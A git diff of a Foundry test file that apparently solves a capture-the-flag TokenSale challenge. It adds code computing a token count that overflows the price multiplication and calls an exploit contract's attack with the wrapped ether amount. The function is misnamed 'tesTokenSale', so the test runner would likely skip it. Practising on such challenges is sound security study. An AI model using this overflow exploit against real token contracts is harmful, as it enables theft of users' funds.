@@ -12,13 +12,22 @@ contract TokenSaleTest is Test {
         // Deploy contracts
         tokenSale = (new TokenSale){value: 1 ether}();
         exploitContract = new ExploitContract(tokenSale);
-        vm.deal(address(exploitContract), 4 ether);
+        vm.deal(address(exploitContract), 5 ether);
     }
 
     // Use the instance of tokenSale and exploitContract
-    function testIncrement() public {
-        // Put your solution here
+    function tesTokenSale() public {
+        uint256 PRICE_PER_TOKEN = 1 ether;
+        uint256 numTokensToTriggerOverFlow = (type(uint256).max / PRICE_PER_TOKEN) + 1;
+        // must send Exact Ether
+        uint256 exactEther;
+        unchecked {
+            exactEther = numTokensToTriggerOverFlow * PRICE_PER_TOKEN;
+        }
+        console.log("exactEther:", exactEther);
+        exploitContract.attack{value: exactEther}(numTokensToTriggerOverFlow);
 
+        console.log("balance:", tokenSale.balanceOf(address(exploitContract)));
         _checkSolved();
     }
 
